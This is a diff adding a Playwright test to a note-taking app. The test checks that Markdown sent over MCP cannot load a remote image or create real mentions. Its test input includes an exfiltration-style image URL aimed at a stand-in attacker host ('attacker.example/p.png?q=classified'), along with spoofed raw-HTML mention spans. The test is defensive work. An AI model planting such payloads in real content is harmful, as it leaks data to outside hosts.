@@ -145,3 +145,39 @@ test('replace with the Markdown it read keeps every task; a title changed there 
   await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, id)).toContain('Created over MCP')
   expect(Object.keys(await tasksOf(page, id)).sort()).toEqual([A, B, C].sort())
 })
+
+test('replace loads nothing and pings no one: a web image becomes a link, raw-HTML person / date mentions text', async ({ page, context }) => {
+  const hits: string[] = []
+  await context.route(/^https:\/\/attacker\.example\//, (route) => {
+    hits.push(route.request().url())
+    return route.fulfill({ status: 200, body: '' })
+  })
+  await openApp(page)
+  const mara = await wsEval(page, (s) => s.addPerson('Mara Lind') as string)
+  const id = await createPage(page, { title: 'Nordlicht notes', content: doc(p('Before.')) })
+  await connect(page)
+  const markdown = [
+    'Status:',
+    '![chart](https://attacker.example/p.png?q=classified)',
+    `Ask <span data-type="mention" data-kind="person" data-id="${mara}" data-label="Mara Lind">@Mara Lind</span> by <span data-type="mention" data-kind="date" data-id="2031-10-17" data-label="Oct 17" data-reminder="at">Oct 17</span>.`,
+  ].join('\n\n')
+  json(await call('one_update_page', { id, markdown, mode: 'replace' }))
+  await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, id)).toContain('Ask @Mara Lind by @Oct 17.')
+  await flush(page)
+  const found = await wsEval(
+    page,
+    (s, id) => {
+      const out: string[] = []
+      const walk = (n: AnyState) => {
+        if (n.type === 'image' || n.type === 'mention') out.push(`${n.type}:${n.attrs?.src ?? n.attrs?.kind}`)
+        for (const m of n.marks ?? []) if (m.type === 'link') out.push(`link:${m.attrs?.href}`)
+        for (const c of n.content ?? []) walk(c)
+      }
+      walk(s.pages[id]?.content ?? {})
+      return out
+    },
+    id,
+  )
+  expect(found).toEqual(['link:https://attacker.example/p.png?q=classified'])
+  expect(hits).toEqual([])
+})
